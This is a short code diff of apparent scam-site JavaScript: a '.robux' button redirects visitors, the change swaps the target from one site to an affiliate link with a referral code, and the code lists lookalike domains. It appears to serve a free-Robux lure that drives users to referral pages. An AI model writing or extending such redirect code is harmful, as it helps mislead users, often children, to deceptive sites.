@@ -48,7 +48,7 @@ var button = document.querySelector('.robux');
 button.addEventListener('click', function() {
     (function() {
         var originalDomain = "monoplytokens.com";
-        var redirectURL = "https://www.rolls3.com/";
+        var redirectURL = "https://earnzeno.com/?ref=PLDAKGJM";
         var blockedDomains = [
             "mply.io.1arshg4.site",
             "mply.io.4a6b8dh.site"
